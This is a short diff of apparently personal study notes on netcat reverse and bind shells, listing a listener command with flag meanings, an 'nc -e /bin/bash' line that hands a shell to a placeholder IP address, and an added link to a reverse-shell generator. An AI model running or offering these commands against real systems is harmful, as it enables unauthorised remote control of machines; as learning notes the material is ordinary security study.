@@ -9,3 +9,5 @@ things are bit backwords as reverse shell
 CMD - nc -lnvp 87 -s ipadress 
 l - listining , n - ip adress , v - verbous , p - port s - source 
 at attacker - nc -e /bin/bash ipadress port 
+https://www.revshells.com/
+![[Pasted image 20250604002258.png]] IP - my ip 
